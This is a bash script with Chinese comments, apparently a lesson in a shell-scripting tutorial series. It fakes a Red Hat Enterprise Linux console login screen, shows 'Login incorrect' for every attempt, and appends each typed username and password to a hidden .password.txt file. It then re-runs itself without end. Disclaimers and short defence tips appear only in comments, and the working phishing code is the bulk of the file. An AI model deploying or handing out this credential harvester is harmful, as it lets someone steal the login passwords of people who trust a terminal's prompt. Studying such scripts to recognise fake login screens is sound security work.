#!/bin/bash
# =============================================================================
# 脚本名称：18_fake_login_screen.sh
# 功能描述：伪造登录界面 - 模拟 Linux 登录屏幕
# 难度等级：⭐⭐⭐⭐ 高级
# 知识点：
#   - clear 清屏
#   - uname -r/-m 系统信息
#   - read -p 提示输入
#   - read -s 隐藏输入（密码）
#   - hostname 获取主机名
#   - awk -F"." 字段分割
#   - sleep 2 暂停
#   - 重定向 >> 追加到文件
# 使用方法：
#   chmod +x 18_fake_login_screen.sh
#   ./18_fake_login_screen.sh
# 警告：仅用于学习和安全测试，不要用于非法用途！
# =============================================================================

# 清屏
clear

# 显示空行
echo

# 模拟 Red Hat 登录界面
echo 'Red Hat Enterprise Linux Server release 6.5 (Santiago)'
echo "Kernel `uname -r` on an `uname -m`"
echo

# 获取主机名（去掉域名部分）
# hostname|awk -F"." '{print $1}' 取第一个点之前的部分
read -p "$(hostname|awk -F"." '{print $1}') login: " user

# 隐藏输入密码
# -s 选项表示不显示输入的字符（secure）
read -s -p "Password: " passwd

# 显示空行
echo

# 暂停 2 秒
sleep 2

# 显示登录失败
echo "Login incorrect" 

# 保存用户名和密码到文件（用于演示，实际是钓鱼攻击）
echo "$user:$passwd" >> .password.txt

# 再尝试 3 次
for i in 1 2 3
do
	echo
	read -p "login: " user
	read -s -p "Password: " passwd
	echo
	sleep 2
	echo "Login incorrect" 
	echo "$user:$passwd" >> .password.txt
done

# 重新执行脚本（无限循环）
sh $0

# 说明：
# 1. 这是一个模拟登录界面的脚本
# 2. 会收集用户输入的用户名和密码
# 3. 保存到.password.txt 文件
# 4. 用于演示社会工程学攻击
# 5. 实际系统中应该禁止这样的脚本

# 安全警告：
# 1. 不要在生产环境运行此脚本
# 2. 不要用于收集真实用户凭证
# 3. 这是教学演示用途
# 4. 实际攻击是违法行为

# 防御方法：
# 1. 使用真正的登录管理器
# 2. 检查登录界面的真实性
# 3. 不要在不安全的终端输入密码
